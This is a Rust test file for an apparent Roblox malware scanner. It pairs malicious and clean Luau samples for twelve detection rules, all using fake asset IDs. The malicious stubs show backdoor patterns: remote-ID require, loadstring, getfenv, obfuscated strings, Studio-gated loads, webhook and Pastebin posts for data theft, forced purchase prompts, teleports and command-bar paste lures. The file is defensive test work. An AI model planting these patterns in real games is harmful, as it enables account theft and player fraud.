use bloxguard_core::config::Config;
use bloxguard_core::engine;
use bloxguard_core::finding::Severity;
use bloxguard_core::loading::{load_bundle, load_bytes, load_source};
use bloxguard_core::model::{Bundle, Completeness, Instance};
use rbx_dom_weak::{
    InstanceBuilder, WeakDom,
    types::{Content, ContentId},
};
use serde_json::json;
use std::collections::BTreeMap;

const FAKE_ID_A: u64 = 999_000_000_000_101;
const FAKE_ID_B: u64 = 999_000_000_000_102;

enum CaseInput {
    Source(String),
    Bundle(Vec<Instance>),
    /// A Roblox file generated at test time. The extension selects the decoder.
    File(&'static str, Vec<u8>),
}

struct Case {
    rule: &'static str,
    label: &'static str,
    should_find: bool,
    input: CaseInput,
}

impl Case {
    fn malicious_source(
        rule: &'static str,
        label: &'static str,
        source: impl Into<String>,
    ) -> Self {
        Self {
            rule,
            label,
            should_find: true,
            input: CaseInput::Source(source.into()),
        }
    }

    fn clean_source(rule: &'static str, label: &'static str, source: impl Into<String>) -> Self {
        Self {
            rule,
            label,
            should_find: false,
            input: CaseInput::Source(source.into()),
        }
    }

    fn malicious_bundle(rule: &'static str, label: &'static str, instances: Vec<Instance>) -> Self {
        Self {
            rule,
            label,
            should_find: true,
            input: CaseInput::Bundle(instances),
        }
    }

    fn clean_bundle(rule: &'static str, label: &'static str, instances: Vec<Instance>) -> Self {
        Self {
            rule,
            label,
            should_find: false,
            input: CaseInput::Bundle(instances),
        }
    }

    fn malicious_file(
        rule: &'static str,
        label: &'static str,
        extension: &'static str,
        bytes: Vec<u8>,
    ) -> Self {
        Self {
            rule,
            label,
            should_find: true,
            input: CaseInput::File(extension, bytes),
        }
    }

    fn clean_file(
        rule: &'static str,
        label: &'static str,
        extension: &'static str,
        bytes: Vec<u8>,
    ) -> Self {
        Self {
            rule,
            label,
            should_find: false,
            input: CaseInput::File(extension, bytes),
        }
    }
}

/// A model with one PackageLink, serialized by the same encoders Studio files use.
fn package_model(link: InstanceBuilder) -> WeakDom {
    WeakDom::new(
        InstanceBuilder::new("DataModel").with_child(
            InstanceBuilder::new("Model")
                .with_name("FAKE_PackageModel")
                .with_child(
                    InstanceBuilder::new("Script")
                        .with_name("FAKE_PackageScript")
                        .with_property("Source", "return true"),
                )
                .with_child(link),
        ),
    )
}

fn encode_rbxm(dom: &WeakDom) -> Vec<u8> {
    let mut bytes = Vec::new();
    rbx_binary::to_writer(&mut bytes, dom, dom.root().children()).expect("encode synthetic rbxm");
    bytes
}

fn encode_rbxmx(dom: &WeakDom) -> Vec<u8> {
    let mut bytes = Vec::new();
    rbx_xml::to_writer_default(&mut bytes, dom, dom.root().children())
        .expect("encode synthetic rbxmx");
    bytes
}

fn instance(name: &str, class: &str, parent: Option<usize>) -> Instance {
    Instance {
        name: name.into(),
        class: class.into(),
        parent,
        ..Instance::default()
    }
}

fn script(name: &str, parent: Option<usize>, source: &str) -> Instance {
    Instance {
        name: name.into(),
        class: "Script".into(),
        parent,
        source: Some(source.into()),
        ..Instance::default()
    }
}

fn inserted(source: &str) -> Vec<Instance> {
    vec![
        instance("FAKE_Model", "Model", None),
        script("FAKE_Script", Some(0), source),
    ]
}

fn bg002_value() -> Vec<Instance> {
    let mut value = instance("FAKE_Id", "NumberValue", Some(0));
    value.properties.insert("Value".into(), json!(FAKE_ID_A));
    vec![
        instance("FAKE_Model", "Model", None),
        value,
        script(
            "FAKE_Script",
            Some(0),
            "require(script.Parent.FAKE_Id.Value)",
        ),
    ]
}

fn bg002_attribute() -> Vec<Instance> {
    let mut model = instance("FAKE_Model", "Model", None);
    model
        .attributes
        .insert("FAKE_asset".into(), json!(FAKE_ID_B));
    vec![
        model,
        script(
            "FAKE_Script",
            Some(0),
            "require(script.Parent:GetAttribute('FAKE_asset'))",
        ),
    ]
}

fn bg002_module() -> Vec<Instance> {
    vec![
        instance("FAKE_Model", "Model", None),
        Instance {
            name: "FAKE_Module".into(),
            class: "ModuleScript".into(),
            parent: Some(0),
            source: Some("return true".into()),
            ..Instance::default()
        },
        script("FAKE_Script", Some(0), "require(script.Parent.FAKE_Module)"),
    ]
}

fn bg006_deep() -> Vec<Instance> {
    let mut instances = vec![instance("FAKE_Root", "Model", None)];
    for index in 0..9 {
        instances.push(instance(
            &format!("FAKE_Nest_{index}"),
            if index % 2 == 0 { "Model" } else { "Part" },
            Some(index),
        ));
    }
    instances.push(script("FAKE_DeepScript", Some(9), "return true"));
    instances
}

fn cases() -> Vec<Case> {
    let escaped = (0..20)
        .map(|index| format!("\\{:03}", 65 + index))
        .collect::<String>();
    let low_entropy = "A".repeat(500);

    let mut package = instance("FAKE_PackageLink", "PackageLink", None);
    package
        .properties
        .insert("PackageId".into(), json!(999_000_000_000_111_u64));
    let mut linked = script("FAKE_Linked", None, "return true");
    linked
        .properties
        .insert("LinkedSource".into(), json!("rbxassetid://999000000000112"));
    let mut empty_package = instance("FAKE_EmptyPackage", "PackageLink", None);
    empty_package
        .properties
        .insert("PackageId".into(), json!(0));
    let mut local_linked = script("FAKE_LocalLinked", None, "return true");
    local_linked.properties.insert(
        "LinkedSource".into(),
        json!("rbxasset://scripts/FAKE_LocalModule.lua"),
    );

    vec![
        Case::malicious_source("BG001", "numeric require", format!("require({FAKE_ID_A})")),
        Case::malicious_source(
            "BG001",
            "aliased require",
            format!("local r = require; r({FAKE_ID_B})"),
        ),
        Case::clean_source(
            "BG001",
            "local module require",
            "require(script.Parent.FAKE_Module)",
        ),
        Case::clean_source(
            "BG001",
            "shadowed require",
            format!("local require = print; require({FAKE_ID_A})"),
        ),
        Case::malicious_bundle("BG002", "NumberValue backed require", bg002_value()),
        Case::malicious_bundle("BG002", "attribute backed require", bg002_attribute()),
        Case::clean_bundle("BG002", "ModuleScript reference", bg002_module()),
        Case::clean_bundle(
            "BG002",
            "missing child remains unresolved",
            inserted("local n=script.Parent:FindFirstChild('FAKE_missing'); require(n)"),
        ),
        Case::malicious_source("BG003", "direct loadstring", "loadstring('return 1')()"),
        Case::malicious_source(
            "BG003",
            "global loadstring alias",
            "local run = _G.loadstring; run(\"print('FAKE')\")",
        ),
        Case::clean_source(
            "BG003",
            "shadowed loadstring",
            "local loadstring=function(x) return x end; loadstring('FAKE')",
        ),
        Case::clean_source("BG003", "loadstring text", "print('loadstring(FAKE)')"),
        Case::malicious_source("BG004", "getfenv mutation", "getfenv().FAKE = true"),
        Case::malicious_source(
            "BG004",
            "setfenv alias",
            "local s=setfenv; s(function() end, {})",
        ),
        Case::clean_source(
            "BG004",
            "shadowed getfenv",
            "local getfenv=function() return {} end; getfenv()",
        ),
        Case::clean_source("BG004", "setfenv text", "print('setfenv is old')"),
        Case::malicious_source(
            "BG005",
            "dense escapes",
            format!("local FAKE_blob = \"{escaped}\""),
        ),
        Case::malicious_source(
            "BG005",
            "string char chain",
            "local FAKE_code=string.char(70,65,75,69,95,67,79,68,69,33)",
        ),
        Case::clean_source(
            "BG005",
            "compact harmless code",
            "local a=1;local b=2;for i=1,10 do a=a+b+i end;return a",
        ),
        Case::clean_source(
            "BG005",
            "low entropy data",
            format!("local FAKE_padding=\"{low_entropy}\";return #FAKE_padding"),
        ),
        Case::malicious_bundle("BG006", "deep hidden script", bg006_deep()),
        Case::malicious_bundle(
            "BG006",
            "core name look alike",
            vec![
                instance("FAKE_Model", "Model", None),
                script("Wоrkspace", Some(0), "return true"),
            ],
        ),
        Case::clean_bundle(
            "BG006",
            "distinct Unicode name",
            vec![script("Café工具", None, "return true")],
        ),
        Case::clean_bundle(
            "BG006",
            "normal server location",
            vec![
                instance("FAKE_Server", "ServerScriptService", None),
                script("FAKE_Gameplay", Some(0), "return true"),
            ],
        ),
        Case::malicious_source(
            "BG007",
            "InsertService LoadAsset",
            format!("game:GetService('InsertService'):LoadAsset({FAKE_ID_A})"),
        ),
        Case::malicious_source(
            "BG007",
            "GetObjects asset URI",
            format!("game:GetObjects('rbxassetid://{FAKE_ID_B}')"),
        ),
        Case::clean_source(
            "BG007",
            "ReplicatedStorage lookup",
            "game:GetService('ReplicatedStorage'):FindFirstChild('FAKE')",
        ),
        Case::clean_source("BG007", "LoadAsset text", "print('LoadAsset')"),
        Case::malicious_source(
            "BG008",
            "webhook post",
            "game:GetService('HttpService'):PostAsync('https://discord.com/api/webhooks/000/FAKE','{}')",
        ),
        Case::malicious_source(
            "BG008",
            "paste endpoint request",
            "game:GetService('HttpService'):RequestAsync({Url='https://pastebin.com/FAKE',Method='POST'})",
        ),
        Case::clean_source(
            "BG008",
            "fixed analytics endpoint",
            "game:GetService('HttpService'):PostAsync('https://analytics.example.test/events','{}')",
        ),
        Case::clean_source(
            "BG008",
            "health check endpoint",
            "game:GetService('HttpService'):GetAsync('https://example.test/FAKE_health')",
        ),
        Case::malicious_source(
            "BG009",
            "Studio gated require",
            format!(
                "if not game:GetService('RunService'):IsStudio() then require({FAKE_ID_A}) end"
            ),
        ),
        Case::malicious_source(
            "BG009",
            "delayed asset load",
            format!("task.wait(120); game:GetService('InsertService'):LoadAsset({FAKE_ID_B})"),
        ),
        Case::clean_source(
            "BG009",
            "Studio debug output",
            "if game:GetService('RunService'):IsStudio() then print('FAKE debug') end",
        ),
        Case::clean_source(
            "BG009",
            "delayed harmless effect",
            "task.wait(120); print('FAKE delayed effect')",
        ),
        Case::malicious_bundle(
            "BG010",
            "inserted purchase prompt",
            inserted(&format!(
                "game:GetService('MarketplaceService'):PromptProductPurchase(player,{FAKE_ID_A})"
            )),
        ),
        Case::malicious_bundle(
            "BG010",
            "inserted teleport",
            inserted(&format!(
                "game:GetService('TeleportService'):Teleport({FAKE_ID_B},player)"
            )),
        ),
        Case::clean_bundle(
            "BG010",
            "product information query",
            inserted(&format!(
                "game:GetService('MarketplaceService'):GetProductInfo({FAKE_ID_A})"
            )),
        ),
        Case::clean_bundle(
            "BG010",
            "private server teleport API",
            inserted(&format!(
                "game:GetService('TeleportService'):TeleportToPrivateServer({FAKE_ID_B},'FAKE',{{}})"
            )),
        ),
        Case::malicious_bundle("BG011", "external PackageLink", vec![package]),
        Case::malicious_bundle("BG011", "external LinkedSource", vec![linked]),
        Case::clean_bundle("BG011", "empty PackageLink", vec![empty_package]),
        Case::clean_bundle("BG011", "bundled LinkedSource", vec![local_linked]),
        Case::malicious_file(
            "BG011",
            "rbxm PackageLink",
            "rbxm",
            encode_rbxm(&package_model(
                InstanceBuilder::new("PackageLink")
                    .with_property("PackageId", ContentId::from("rbxassetid://999000000000113")),
            )),
        ),
        Case::malicious_file(
            "BG011",
            "rbxmx PackageLink",
            "rbxmx",
            encode_rbxmx(&package_model(
                InstanceBuilder::new("PackageLink").with_property(
                    "PackageContent",
                    Content::from_uri("rbxassetid://999000000000114"),
                ),
            )),
        ),
        Case::clean_file(
            "BG011",
            "rbxm unpublished PackageLink",
            "rbxm",
            encode_rbxm(&package_model(
                InstanceBuilder::new("PackageLink")
                    .with_property("PackageContent", Content::none()),
            )),
        ),
        Case::clean_file(
            "BG011",
            "rbxmx model without package data",
            "rbxmx",
            encode_rbxmx(&package_model(
                InstanceBuilder::new("Folder").with_name("FAKE_PackageLinkNotes"),
            )),
        ),
        Case::malicious_source(
            "BG012",
            "command bar paste instruction",
            "local FAKE_message='Paste this into the command bar to fix the model'",
        ),
        Case::malicious_source(
            "BG012",
            "command bar run instruction",
            "local FAKE_message=\"In Studio's command bar, run this: require(999000000000112)\"",
        ),
        Case::clean_source(
            "BG012",
            "command bar description",
            "local FAKE_help='The command bar runs Luau expressions during development.'",
        ),
        Case::clean_source(
            "BG012",
            "ordinary source comment",
            "-- FAKE local helper returns a fixed value\nreturn true",
        ),
    ]
}

#[test]
fn v0_1_rule_matrix_has_two_malicious_and_two_clean_cases_per_rule() {
    let config = Config::default();
    let mut results: BTreeMap<&str, [usize; 4]> = BTreeMap::new();

    for case in cases() {
        let extension = match &case.input {
            CaseInput::File(extension, _) => extension,
            CaseInput::Source(_) | CaseInput::Bundle(_) => "luau",
        };
        let input = format!(
            "FAKE_eval_{}_{}.{extension}",
            case.rule,
            case.label.replace(' ', "_")
        );
        let document = match case.input {
            CaseInput::Bundle(instances) => load_bundle(
                Bundle {
                    schema_version: 1,
                    instances,
                },
                &input,
                &config.limits,
            ),
            CaseInput::Source(source) => load_source(&source, &input, "Script", &config.limits),
            CaseInput::File(extension, bytes) => {
                load_bytes(&input, extension, &bytes, &config.limits)
            }
        };
        assert_eq!(
            document.completeness,
            Completeness::Complete,
            "{} {} loader reasons: {:?}",
            case.rule,
            case.label,
            document.reasons
        );

        let report = engine::scan_documents(vec![document], &config);
        assert_eq!(
            report.completeness,
            Completeness::Complete,
            "{} {} scan reasons: {:?}",
            case.rule,
            case.label,
            report.inputs
        );
        let target_count = report
            .findings
            .iter()
            .filter(|finding| finding.rule_id == case.rule)
            .count();
        assert_eq!(
            target_count,
            usize::from(case.should_find),
            "{} {} findings: {:?}",
            case.rule,
            case.label,
            report
                .findings
                .iter()
                .map(|finding| finding.rule_id.as_str())
                .collect::<Vec<_>>()
        );

        let high_or_critical_count = report
            .findings
            .iter()
            .filter(|finding| finding.severity >= Severity::High)
            .count();
        if !case.should_find {
            assert_eq!(
                high_or_critical_count,
                0,
                "{} {} clean report has high or critical findings: {:?}",
                case.rule,
                case.label,
                report
                    .findings
                    .iter()
                    .filter(|finding| finding.severity >= Severity::High)
                    .map(|finding| (finding.rule_id.as_str(), finding.severity))
                    .collect::<Vec<_>>()
            );
        }

        let counts = results.entry(case.rule).or_default();
        if case.should_find {
            counts[0] += 1;
            counts[1] += target_count;
        } else {
            counts[2] += 1;
            counts[3] += high_or_critical_count;
        }
    }

    assert_eq!(results.len(), 12);
    eprintln!(
        "| Rule | Malicious detected | Malicious total | Clean high or critical | Clean total |"
    );
    eprintln!("| --- | ---: | ---: | ---: | ---: |");
    for number in 1..=12 {
        let rule = format!("BG{number:03}");
        let counts = results
            .get(rule.as_str())
            .expect("every v0.1 rule is present");
        // At least two cases of each kind per rule; every malicious case found and
        // no clean case with a high or critical finding.
        assert!(
            counts[0] >= 2 && counts[1] == counts[0] && counts[2] >= 2 && counts[3] == 0,
            "{rule} matrix shape or result: {counts:?}"
        );
        eprintln!(
            "| {rule} | {} | {} | {} | {} |",
            counts[1], counts[0], counts[3], counts[2]
        );
    }
}
